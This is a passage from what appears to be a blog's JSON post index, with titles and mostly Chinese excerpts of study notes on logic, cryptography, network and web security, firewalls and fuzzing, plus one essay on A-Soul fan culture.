its complement l c does not appear in any clause of S Let S be a set of clauses and let l be a pure literal in S. Let S′ be obtained from S by deleting every clause containing l. Then S≈S′ 也就是删除纯文字不影响及健全性的传递 2.2. Unit Clauses Let {l}∈S be a unit clause and let S′ be obtained from S by deleting every clause containing $l$ and by deleting $l^c$ from every (remaining) clause. Then S≈S′.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-序","date":"2022-02-13T21:39:34.000Z","path":"posts/c666161e/","slug":"计算机数理逻辑-一阶逻辑-1","permalink":"https://hejueyun.github.io/posts/c666161e/","excerpt":"1. Orderings 序序是一个关系 A (strict) ordering on a set X is a transitive and irreflexive binary relation on X, here denoted by ≻ （只有严格有序集是要求非自反，即无相等元素的？毕竟相等的话就是multi-set了，并且这个符号也不是$\\geq$） The pair (X, ≻) is then called a (strictly) ordered set有序集 (感觉有点类似群，只不过群是在集合的基础上定义加乘法，而有序集是在集合的基础上定义了序) An element x of X is minimal wrt.(with regard to) ≻, if there is no y in X such that x ≻ y A minimal element x in X is called the smallest (or strictly minimal) element, if for all y ∈ X different from x, y ≻ x. Maximal and largest (or strictly maximal) elements are defined analogously(类似的) $≺$ for the inverse relation $≻^{−1}$ x ⪰ y iff either x ≻ y or x &#x3D; y In a total ordering if an element is minimal then it is the smallest element. In any ordering, the smallest element is unique, if exists 1.1. Strict partial order 严格偏序 Irreflexivity: Transitivity Asymmetry 1.1.1. Total order 全序关系 也称linear order线性关系 A strict total order 则会将reflexive变为irreflexive.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-集合论","date":"2022-02-10T23:11:11.000Z","path":"posts/301925f/","slug":"计算机数理逻辑-命题逻辑-0","permalink":"https://hejueyun.github.io/posts/301925f/","excerpt":"1. Sets 集合 A set is composed of elements . a ∈ S denotes that a is an element of set S The set with no elements is the empty set , denoted ∅. 1.1. Multi-Sets 多重集 sets which allow repetition $S(x)$ specifies the number of occurrences of the element x (of the base set X) within S S &#x3D; {a, a, a, b, b} is a multi-set over {a, b, c}, then S(a) = 3, S(b) = 2, S(c) = 0 denoted: $S: A\\rightarrow{Z^{+}}$，A is the underlying set of the multiset multi-set S over X is called finite, if &#123; x ∈ X | S(x) &gt; 0&#125;| &lt; ∞. 2. Set Operators 集合操作符 Let S and T be sets. S is a subset of T , denoted S ⊆ T , iff every element of S is an element of T , that is, x ∈ S → x ∈ T . S is a proper subset of T , denoted S ⊂ T , iff S ⊆ T and S ≠ T Union联合 S ∪ T , the union of S and T , is the set consisting of those elements which are elements of either S or T (or both). Intersection交集 S ∩ T , the intersection of S and T , is the set consisting of those elements which are elements of both S and T . If S ∩ T &#x3D;∅ then S and T are disjoint . Difference差集 S − T , the difference of S and T , is the set of elements of $S$ that are not elements of $T$ complement 补集 Let S be understood as a universal set; then $\\bar{T}$ , the complement of T , is S − T Cartesian product笛卡尔积 Let S and T be sets. S × T , their Cartesian product , is the set of all pairs ( s , t ) such that s ∈ S and t ∈ T 3. Sequences 序列Let $S$ be a set.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-命题逻辑-归结","date":"2022-02-09T23:09:30.000Z","path":"posts/f59d8546/","slug":"计算机数理逻辑-命题逻辑-3","permalink":"https://hejueyun.github.io/posts/f59d8546/","excerpt":"The method of resolution is an efficient method for searching for a proof. 1. Reasoning Methods Resolution DPLL&#x2F;CDCL Tableaux A refutational reasoning反驳性推理 method (or just reasoning method RM) is an algorithm (not necessarily terminating) which given as an input a set of formulas S outputs either “satisfiable”, “unsatisfiable” or “don’t know” 1.1. soundnessConsider a set of formulas Φ (usually called a fragment).A reasoning method RM is sound for Φ if for any set S ⊆ Φ: if RM(S) is “satisfiable” then there is an interpretation satisfying all formulas in S if RM(S) is “unsatisfiable” then there is no interpretation satisfying all formulas in S. A trivial琐碎 RM which on all inputs returns “don’t know” is a sound reasoning method 1.2. CompletenessA reasoning method RM is (refutationally) complete for Φ if for any setS ⊆ Φ: if S is unsatisfiable then RM(S) is terminating and returns “unsatisfiable”","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-命题逻辑-演绎","date":"2022-02-07T16:16:19.000Z","path":"posts/ec86b407/","slug":"计算机数理逻辑-命题逻辑-2","permalink":"https://hejueyun.github.io/posts/ec86b407/","excerpt":"1. 形式语言 语言按照语法分类大致可分为自然语言与形式语言两种。 自然语言（Natural Language）就是人类讲的语言，比如汉语、英语等。此类语言不是人为设计的语言，而是自然进化而成的。 形式语言（Formal Language）是为了满足特定的应用而人为设计的语言。例如数学使用的数字与运算符号、化学使用的分子式。编程语言同样也是一种形式语言，是专门用来表达计算过程的形式语言。 形式语言有严格的语法（Syntax）规则。语法规则是由符号（Token）与结构（Structure）的规则组成。 Token 相当于自然语言中的单词与标点、数学式中的数字与运算符。例如 6 &#x3D; 3 + 3$，之所以无法构成一个等式，是因为 $ 符号并不属于合法的 Token 符号。 结构则是指 Token 的排列方式， 如 3 &#x3D; + 3 虽然加号与等号均为核发的 Token 运算符，但是存在一定的结构错误。 关于 Token 的规则称为词法（Lexical）规则。而关于结构的规则称为语法（Semantic）规则。 当阅读一个自然语言句子或是形式语言句子时，首先要明白词法规则（Token），然后需要弄清楚句子的语法结构（如学习阅读外语句子时）。分析句子结构的过程就是解析（Parse）的过程 例如 正则表达式 自动机 2. Deductive ProofThe deductive systems studiedwere developed in an attempt to formalize mathematical reasoning. 所研究的演绎系统是为了使数学推理正规化而开发的。 引入演绎证明方法的意义 The set of axioms may be infinite Very few logics have decision procedures like propositional logic A decision procedure may not give insight into the relationship between the axioms and the theorem A decision procedure produces a ‘yes&#x2F;no’ answer, so it is difficult to recognize intermediate results (lemmas). Clearly, the millions of mathematical theorems in existence could not have been inferred directly from axioms A decision procedure produces a ‘yes&#x2F;no’ answer, so it is difficult to recognize intermediate results (lemmas)","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-命题逻辑-语法与语义","date":"2022-02-05T23:01:28.000Z","path":"posts/cacbbbdb/","slug":"计算机数理逻辑-命题逻辑","permalink":"https://hejueyun.github.io/posts/cacbbbdb/","excerpt":"1. IntroductionLogic formalizes valid methods of reasoning 逻辑将有效的推理方法正规化 比如syllogism&#x2F;ˈsɪləˌdʒɪz(ə)m&#x2F;三段论 atomic/əˈtɒm.ɪk/ proposition statements that have no internal structure 原子命题是没有内部结构的语句 cannot be further decomposed and can be assigned a truth value of true or false often shortened to atoms syntax define the legal structure of formulas in propositional logic semantics the meaning of formulas T or F Another notation is ⊤ for true and ⊥ for false Proof A proof is a deduction of a formula from a set of formulas called axioms using rules of inference. 证明是利用推理规则从一组称为公理的公式中推导出一个公式 Propositional logic is central to the design of computer hardware because hardware is usually designed with components having two voltage levels that are arbitrarily assigned the symbols 0 and 1. Circuits/ˈsərkət/ are described by idealized elements called logic gates 命题逻辑是计算机硬件设计的核心，因为硬件的设计通常有两个电压电平，被任意分配为符号0和1。电路由称为逻辑门的理想化元素描述 2. Propositional Formulas命题公式 expression 表达式 denoted the computation of a value from other values 表示从其他数值中计算出一个数值 In propositional logic, the term formula is used instead atomic propositions An unbounded set of symbols P Boolean operators 2.1. subformulas 2.2. Formulas as Trees","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"软件安全备忘录：Fundamentals","date":"2022-01-31T20:12:07.000Z","path":"posts/a3244b40/","slug":"软件安全备忘录：引言","permalink":"https://hejueyun.github.io/posts/a3244b40/","excerpt":"1. Main GoalVerified trustworthy software systems 经过验证的值得信赖的软件系统 Reliability Availability Safty Resilience 复原能力 in timely response to events 2. Standard Notions of Security 安全的标准概念Safety vs Security Safety: any input &#x3D;&gt; desired output Secruity: bad input &#x3D;&gt; bad output wrong input does not cause failure or crashes most sofeware system do not have precise准确 explict明确 security objectives 3. Software Security Problems","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"软件工程基础-软件质量与其他","date":"2022-01-24T23:40:00.000Z","path":"posts/3ff63edb/","slug":"软件工程基础-软件质量与其他","permalink":"https://hejueyun.github.io/posts/3ff63edb/","excerpt":"1. Software Quality1.1. Desirable Software Quality(理想的软件质量) External characteristics： External characteristics are characteristics that a user of the software product is aware of Internal : developer directly experience 联系 The difference between internal and external characteristics isn’t completely clear-cut because at some level internal characteristics affect external ones. Software that isn’t internally understandable or maintainable impairs your ability to correct defects, which in turn affects the external characteristics of correctness and reliability. Software that isn’t flexible can’t be enhanced in response to user requests, which in turn affects the external characteristic of usability. External characteristics： Correctness 一个系统在其规格、设计和实现中没有错误的程度 Usability 用户学习和使用一个系统的容易程度 Efficiency 对系统资源的最小化使用，包括内存和执行时间 Reliability 一个系统在规定的条件下，无论何时都能执行所需功能的能力–具有较长的平均故障间隔时间( a long mean time between failures) Integrity 完整性的概念包括限制未经授权的用户访问，以及确保数据被正确访问 Adaptability 一个系统在没有修改的情况下，可以在其专门设计之外的应用或环境中使用的程度 Accuracy 精确性与正确性不同；它决定了一个系统在多大程度上完成了它所构建的工作(而不是关注错误) Robustness 一个系统在无效的输入或紧张的环境条件下继续运行的程度 internal quality characteristics： Maintainability 你可以修改一个软件系统以改变或增加功能、提高性能或纠正缺陷的容易程度 The ease with which you can modify a software system to change or add capabilities, improve performance, or correct defects Flexibility 可以修改一个系统的用途或环境的程度，而不是它的专门设计 Portability 你可以修改一个系统以在不同于其专门设计的环境中运行的容易程度 Reusability 你可以在其他系统中使用一个系统的部分的程度和容易程度 Readability 你能够阅读和理解一个系统的源代码的难易程度 Testability 你可以对一个系统进行单元测试和系统测试的程度；你可以验证该系统满足其要求的程度 Understandability 在系统-组织和详细陈述层面上，你能理解一个系统的难易程度。与可读性相比，可理解性与系统在更一般的层面上的一致性有关 Readability is part of understandability. But you can have readable methods or functions and an impossible to grasp architecture","categories":[{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://hejueyun.github.io/categories/Software-Engineering/"}],"tags":[]},{"title":"密码学备忘录-工作模式","date":"2022-01-20T16:28:13.000Z","path":"posts/c82bbc9e/","slug":"密码学备忘录-工作模式","permalink":"https://hejueyun.github.io/posts/c82bbc9e/","excerpt":"1. 工作模式Modes of Operation 解决如何将cipher加密算法运用到plaintext明文的问题 有block分组和stream流两种方式 ECB，CBC，OFB，CFB，CTR和XTS模式仅仅提供了机密性；为了保证加密信息没有被意外修改或恶意篡改，需要采用分离的消息验证码，例如CBC-MAC 1.1. ECB Electronic codebook 当明文分组重复时，密文也重复，易实现统计分析攻击 结构化数据，将产生大量重复的密文 ECB模式最严重的问题是使得对手选取部分分组进行重放攻击 1.2. CBC Cipher-block chaining 保护IV的原因 如果敌手能欺骗接收方使用不同的Iv值，敌手就能够在明文的第1个分组中插入自己选择的比特值 错误传播 明文错误传播 加密前的明文中某个错误对解密后恢复的明文的影响 CBC没有明文错误传播 密文错误传播 密文组中某部分比特错误 某密文组丢失 被插入一个密文组 CBC的密文错误传播很小 padding oracle attack","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-消息验证码MAC","date":"2022-01-19T23:59:07.000Z","path":"posts/d83c07b3/","slug":"密码学备忘录-消息验证码MAC","permalink":"https://hejueyun.github.io/posts/d83c07b3/","excerpt":"1. 定义用途 实现authentication 2. 实现方式 哈希 其中一种实现方法称为HMAC 分组密码 appended to message as a digest 接收者进行相同计算，比较MAC前后是否一致 2.1. approach 不可逆 均匀分布 均匀依赖每一bit消息","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-前置知识","date":"2022-01-19T23:05:49.000Z","path":"posts/af185d1f/","slug":"密码学备忘录-前置知识","permalink":"https://hejueyun.github.io/posts/af185d1f/","excerpt":"1. sec: cyber vs infovcs netcyber &gt;&#x3D; info + net info: info c.i.a confidentiality Integrity Auth Availablity 2. 攻击的主要形式 拦截Interception 中断(Interruption) 传递大量”废纸” 拒绝服务攻击Dos 偷看 窃听 Eavesdropping 篡改&#x2F;删节Tampering 伪装&#x2F;冒充身份 Masquerade 复印后再次传递 重放 Replay 攻击信息实时性&#x2F;真实性 否认发送&#x2F;接收 deny 阻断访问式攻击denial-of-access attack 勒索软件 ransomware (e.g. WannaCry) 2.1. Active and passive attacks Sr. No. Key Active Attack Passive Attack 1 Modification In Active Attack, information is modified. In Passive Attack, information remain unchanged. 2 Dangerous For Active Attack is dangerous for Integrity as well as Availability. Passive Attack is dangerous for Confidentiality. 3 Attention Attention is to be paid on detection. Attention is to be paid on prevention. 4 Impact on System In Active Attack, system is damaged. In Passive Attack, system has no impact. 5 Victim Victim gets informed in active attack. Victim does not get informed in passive attack. 6 System Resources System Resources can be changed in active attack. System Resources are not changed in passive attack. 7 Property integrity &amp;&amp; availability confidentiality 被动攻击 在未经用户同意和认可的情况下，将信息或数据文件泄露给系统攻击者，但不对数据信息做任何修改。威胁信息机密性。 主动攻击 旨在篡改系统信息、改变系统状态等，威胁信息的可用性和真实性。 2.2. Security Services","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-伪随机数","date":"2022-01-19T19:13:56.000Z","path":"posts/f6b1e424/","slug":"密码学备忘录-伪随机数","permalink":"https://hejueyun.github.io/posts/f6b1e424/","excerpt":"1. pseudorandom number generation1.1. 随机数的作用 防止重放攻击 keystream for a one-time pad（一次性密码的密钥流） public key generation 生成公钥 1.2. 伪随机数和随机数区别 deterministic algorithm seed 1.3. 种类1.3.1. 1. Linear Congruential Generator 线性同余生成器 $x_{n+1}&#x3D;(aX_n+c)\\bmod{m}$ 特点 存在周期 32bit计算","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-复习总纲","date":"2022-01-12T19:00:15.000Z","path":"posts/8b9f706b/","slug":"密码学备忘录-复习总纲","permalink":"https://hejueyun.github.io/posts/8b9f706b/","excerpt":"1. mode of operation Workflow Advantages Limitations ECB Electronic Codebook 电码本 $C_i&#x3D;E_k(M_i)$ 简单、主要用于少量分组的传输。没有明密文错误传播 当明文分组重复时，密文也重复，易实现统计分析攻击 CBC Cipher block chaining 密文分组链接 $C_i&#x3D;E_k(M_i \\bigoplus{C_{i-1}})$ $C_0&#x3D;IV$ CBC没有明文错误传播，密文错误传播小 需要初始化和保护IV（原因），前面的分组会对后面的产生影响 CFB Ciphertext feedback 密文反馈 $C_i&#x3D;M_i \\bigoplus{E_k(C_{i-1}})$ $C_0&#x3D;IV$ 可作为随机数生成器 在错误发生后，错误会在几个区块内传播（但不是无限期地传播）。 OFB Output feedback 输出反馈 $O_i&#x3D;E_k(O_{i-1})$ $C_i&#x3D;M_i\\bigoplus O_{i-1}$ $O_0&#x3D;IV$ 可作为随机数生成器，密文1bit错误只会导致对应的1bit出错 接收者和发送者必须保持同步 CTR Galois&#x2F;Counter 计数器 $O_i&#x3D;E_k(i)$ $C_i&#x3D;M_i\\bigoplus O_{i-1}$ 速度快 对每一分组必须用不同的$K$和计数$i$ AES-XTS - - $T$ is tweak, $H$ is a hash function $C&#x3D;H(T)\\bigoplus{E(K,H(T)\\bigoplus{M})}$ 高效 2. Symmetric Algorithm DES AES 3DES RC4 Basic In DES the data block is divided into two halves. In AES the entire data block is processed as a single matrix. EEE&#x2F;EDE RC4生成一个伪随机的比特流（一个密钥流）。这些比特流可以通过与明文比特异或来进行加密 Principle DES work on Feistel Cipher structure. AES works on Substitution and Permutation Principle. - PRNG Plaintext 明文按64位进行分组，以比特为单位 Plaintext can be of 128,192, or 256，以字节为单位 bits - 以字节为单位 Key size 密钥长64位，有效密钥长度56（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1 密钥长度则可以是128，192或256比特 EEE的有效密钥长度为168位（56x3），但由于中途相遇攻击，它的有效安全性仅为112位 40–2048 bits Rounds 16 rounds 10 rounds for 128-bit algo12 rounds for 192-bit algo14 rounds for 256-bit algo - 1 Rounds Names Expansion Permutation, Xor, S-box, P-box, Xor and Swap. Subbytes, Shiftrows, Mix columns, Addroundkeys. - KSA(s-box)&#x2F;Encryption(PRNG) Security 1. S盒提供了DES的核心安全性—如果没有S盒，密码会是线性的，很容易破解 2. S盒，P置换和E扩张各自满足了混淆扩散原则 3. Avalanche Effect 4. Timing Attacks &amp;&amp; Cryptanalysis 1. SubBytes提供了非线性代换保证安全性 - RC4安全性主要取决于于初始密钥的保密性 Speed DES is comparatively slower. AES is faster. 慢中慢 7 cycles per byte on original Pentium 2.1. DES Steps Changes Expansion Permutation $R_i$ is expanded by using the expansion permutation, 32-&gt;48 Key mixing $R_i&#x3D;R_i\\bigoplus{Subkey_i}$ 48 S-box Substitution 1.$R_i$is divided into eight 6-bit pieces before processing by the S-boxes 2.8个S-boxes中的每一个都根据一个非线性转换，以查找表的形式，将其6个输入位替换为4个输出位 48-&gt;32 P-box Permutation 根据映射规则表，把输入的每位映射到新的输出位 32 XOR and Swap $R_{i+1}&#x3D;L_i\\bigoplus{R_{i}}$ 32 Key schedule PC1\\PC2（permutation chosen） 64-&gt;56-&gt;48 2.2. AES Steps length SubBytes 矩阵中各字节被固定的8位查找表中对应的特定字节所替换，输入的高4-bit对应的值作为行标，低4-bit对应的值作为列标，$S(b_{i,j})&#x3D;S(a_{i,j})$ 128 ShiftRows 矩阵中每一列的各个字节循环向左方位移，且位移量则随着列数递增而递增（第一行保持不变，第二行循环左移8比特，第三行循环左移16比特，第四行循环左移24比特） 128 MixColumns linear transformation 矩阵乘法 128 AddRoundKey $b_{i,j}&#x3D;K_{i,j}\\bigoplus{a_{i,j}}$ 128 Key expansion 若j%4&#x3D;0,则w[j]&#x3D;w[j-4]⊕g(w[j-1]),否则w[j]&#x3D;w[j-4]⊕w[j-1] 128 3. Assymetric Algorithm","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"HTTPS-PKI笔记","date":"2021-12-29T16:43:09.000Z","path":"posts/d4e10e6c/","slug":"HTTPS-PKI","permalink":"https://hejueyun.github.io/posts/d4e10e6c/","excerpt":"1. 前置知识 机密性：对称加密 完整型：消息验证码（MAC） 可用性：数字签名（DSA） 1.1. DH密钥协商算法 通讯双方任何一方无法独自计算出一个会话密钥，通讯双方各自保留一部分关键信息，再讲另外一部分信息告诉对方，双方有了全部信息才能计算出相同的会话秘钥 ECC算法和DH结合使用，用于密钥磋商，这个密钥交换算法称为ECDH。交换双方可以在不共享任何秘密的情况下协商出一个密钥 由于 ECDH 密钥交换协议不验证公钥发送者的身份，因此无法阻止中间人攻击。如果监听者 Mallory 截获了 Alice 的公钥，就可以替换为他自己的公钥，并将其发送给 Bob。Mallory 还可以截获 Bob 的公钥，替换为他自己的公钥，并将其发送给 Alice。这样，Mallory 就可以轻松地对 Alice 与 Bob 之间发送的任何消息进行解密。他可以更改消息，用他自己的密钥对消息重新加密，然后将消息发送给接收者。 为了解决此问题，Alice 和 Bob 可以在交换公钥之前使用数字签名对公钥进行签名。有两种方法可以实现此目的： 用安全的媒体（例如语音通信或可信载运商）在双方之间传输数字签名密钥。 使用公共证书颁发机构 (CA) 向双方提供可信数字签名密钥。","categories":[{"name":"Computer Network","slug":"Computer-Network","permalink":"https://hejueyun.github.io/categories/Computer-Network/"},{"name":"Notes","slug":"Computer-Network/Notes","permalink":"https://hejueyun.github.io/categories/Computer-Network/Notes/"}],"tags":[]},{"title":"身份隐私保护协议系统设计","date":"2021-12-27T23:06:15.000Z","path":"posts/b3344f54/","slug":"身份隐私保护协议系统设计","permalink":"https://hejueyun.github.io/posts/b3344f54/","excerpt":"","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"关于后Asoul时代的胡思乱想","date":"2021-12-25T23:06:15.000Z","path":"posts/a1f1fb0f/","slug":"关于后Asoul时代的胡思乱想","permalink":"https://hejueyun.github.io/posts/a1f1fb0f/","excerpt":"鲁迅曾经发问：娜拉走后怎样？如今Au们要问：Asoul走后怎样？ 鲁迅将《玩偶之家》的女性主义解构，娜拉在“后娜拉时代”得到现实主义的重新审视。而足够幸运的话，Asoul的名字也会在一篇文化与传播的论文中出现，届时，五位姑娘的形象也会在“后Asoul时代”下被重读。 为此，我们不妨大胆假设，设想自己是后ASoul时代的一名传播学子，想要把自己的经历写成关于后Asoul的时代的一篇论文。 1. 作为Asoul文化的独特万事开头难，第一道关卡赫然摆在你面前：如何解释它的研究意义——换句话说，如何挖掘Asoul其作为文化的价值？为此，你开始溯源Asoul，去挖掘沾满泥泞的文化之根。 Asoul是怎样的一种文化？偶像(粉丝)文化。这是显然的，但你想走得更深，因为你注意到了它身体里流淌的ACG血液。同人社团，二创游戏与画作……Asoul仿佛让你想起了东方Project。事实上，在同人的话语体系下，Asoul与东方并没什么差别。 一股绿得发青的血脉突然吸引了你的注意，那是属于污秽与躁动的抽象文化。在汇聚了红牌楼、孙笑川、吉普赛、伐木工与动物园等众多支流后，抽象这条大河继续浩浩汤汤地奔涌过神奈川，淌过了冲浪TV，奔向了China_irl；而其中，一条小支流却静悄悄地偏离了河道，最终流到了Asoul。远道而来的嬉皮士们带着他们独有的风气，挑战公序良俗，嘲讽落伍文化；万向天引、链接诈骗成了他们的拿手好戏，辱骂、钓鱼和小作文是消解他们与偶像之间不平等的独门绝技。 而当几种文化汇聚到Asoul时，属于Asoul文化的文化诞生了。各家各取所长，组织纪律严明的粉丝文化影响了三和大神的抽象，抽象打破规则的精神则进一步影响了同人创作。可以作为对比的是，作为抽象文化鼎盛、百校联盟时期的带学日报，其后继者魂报不过是Asoul创作中最不起眼的一个。 死于铁拳的带学日报","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Wireless Network Security","date":"2021-12-13T22:45:25.000Z","path":"posts/6eddbcac/","slug":"Wireless-Network-Security","permalink":"https://hejueyun.github.io/posts/6eddbcac/","excerpt":"1. background1.1. Categories of wireless networks Wireless Personal Area Network (WPAN) Bluetooth Wireless Local Area Network (WLAN)（Wi-Fi） IEEE 802.11a&#x2F;b&#x2F;g&#x2F;n Wireless Wide Area Network (WWAN) Mobile phone networks (5G&#x2F;4G&#x2F;3G&#x2F;GPRS&#x2F;CDMA) 1.2. IEEE802.11 (WLAN)1.2.1. Infrastructure mode 服务集（Service set） 是无线局域网中的一个术语，用以描述802.11无线网络的构成单位（一组互相有联系的无线设备），使用服务集标识符（SSID）作为识别。可以分为独立基本服务集（IBSS）、基本服务集（BSS）和扩展服务集（ESS）三类 BSS (Basic Service Set or cell) an AP (Access Point（接入点）, or base station（基站）) + wireless stations. ESS (Extended Service Set) two or more BSSes interconnected by a Distributed System (a cable, a wired network, or another WLAN). All communications are via APs SSID：Service Set Identifier 基本服务集标识符（BSSID），表示的是AP的数据链路层的MAC地址 扩展服务集定标识符（ESSID），一个最长32字节区分大小写的字符串,表示无线网络的名称 1.2.2. Ad hoc mode(对等拓扑模式)也就是独立基本服务集（IBSS） Used when no pre-defined infrastructure – stations&#x2F;clients communicate directly without any AP","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[]},{"title":"SSL","date":"2021-12-06T10:59:42.000Z","path":"posts/7f474ad7/","slug":"SSL","permalink":"https://hejueyun.github.io/posts/7f474ad7/","excerpt":"1. threats On-line identity theft by which credentials or any other valuable information are obtained Spoofing&#x2F;phishing attacks tricking users onto the fake website DNS-based attacks altering the DomainName-IP address mappings in the DNS server or the entries in a desktop’s Hosts file to direct users to a fraudulent server (also referred to as pharming). Keyloggers e.g. a browser helper object that detects changes to URL and logs information when a URL is at a designated credential collection site. 2. Web Traffic Security Requirements Authentication Using Web authN methods Authorisation done by authorisation decision engine in the web container Confidentiality and Integrity using SSL 2.1. Web authNHTTP basic authentication With&#x2F;without SSL. Username&#x2F;password are collected via a browser dialog box, and sent to the web server in the HTTP Authentication Header.Digest(摘要) authentication scheme Password is transmitted as an MD5 digest. No need to use confidentiality protection.Form-based authentication With&#x2F;without SSL. Username&#x2F;password along with other data(区别于basic，可收集更多可用于身份认证信息) are collected via a web application provided login page, and sent to the web server as part of the form data.Certificate-based authentication Must use SSL. Can support both client and server authN. 3. SSL(Secure Sockets Layer, 安全套接层)3.1. ports","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[]},{"title":"防火墙","date":"2021-12-05T22:58:57.000Z","path":"posts/9c75190f/","slug":"防火墙","permalink":"https://hejueyun.github.io/posts/9c75190f/","excerpt":"1. Backgroundnetwork access policy default-deny principle Data Formats Network attacks Port scanning IP spoofing Packet sniffing Normally, NIC only picks up packets destined to this MAC address. But, if the NIC card is set to promiscuous mode(混杂模式), then all the packets on the channel will be picked up DoS (Denial of Service) attacks smurf attack (大量icmp echo Request, ping) 2. Stateless Firewall(无状态防火墙) Filtering rules (network access policy) are defined based on source&#x2F;dest addresses, source&#x2F;dest ports, and TCP flags (SYN&#x2F;ACK).","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[]},{"title":"模糊测试笔记","date":"2021-11-25T23:01:03.000Z","path":"posts/e6591ea9/","slug":"模糊测试笔记","permalink":"https://hejueyun.github.io/posts/e6591ea9/","excerpt":"1. 定义 In the academic world, fuzzing can be most closely related to boundary value analysis (BVA), where you look at the range of known good values for a particular input and create test values that straddle the boundary cases of known good and bad values. It is typically an automated or semiautomated process that involves repeatedly manipulating and supplying data to target software for processing. All fuzzers fall into one of two categories: mutation-based fuzzers(变异测试), which apply mutations on existing data samples to create test cases, and generation-based fuzzers(生成测试), which create test cases from scratch by modeling the target protocol(协议) Or file format(文件格式). 1.1. 边界值分析（boundary value analysi） BVA is another Black Box Test Design Technique, which is used to find the errors at boundaries of input domain (tests the behavior of a program at the input boundaries) rather than finding those errors in the centre of input. So, the basic idea in boundary value testing is to select input variable values at their: minimum, just above the minimum, just below the minimum, a nominal value, just below the maximum, maximum and just above the maximum. That is, for each range, there are two boundaries, the lower boundary (start of the range) and the upper boundary (end of the range) and the boundaries are the beginning and end of each valid partition. We should design test cases which exercise the program functionality at the boundaries, and with values just inside and outside the boundaries. Boundary value analysis is also a part of stress and negative testing. Suppose, if the input is a set of values between A and B, then design test cases for A, A+1, A-1 and B, B+1, B-1. 2. 阶段（FUZZING PHASES） Identify target 确定目标先于选择模糊测试工具 Identify inputs Virtually all exploitable vulnerabilities are caused by applications accepting user input and processing that data without first sanitizing it or applying validation routines. Enumerating input vectors（枚举输入向量） is pivotal to the success of fuzzing. Anything sent from the client to the target should be considered an input vector. 